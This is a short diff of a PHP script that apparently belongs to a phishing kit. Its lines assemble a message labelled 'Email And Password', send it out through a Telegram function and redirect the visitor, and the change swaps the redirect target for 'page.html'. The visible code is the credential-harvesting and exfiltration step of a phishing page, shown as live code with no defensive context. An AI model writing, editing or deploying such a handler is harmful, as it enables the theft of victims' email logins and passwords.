@@ -11,7 +11,7 @@ $rnessage = "$message\n";
 $message .= "--------Eeddd.-ca------\n";
 $subject = "Eeddd Email And Password-Edd\r\n\r\n".$message;
 send_telegram_msg($message);
-header("Location: _+_==+==_+.htm");
+header("Location: page.html");
 
 ?>
         
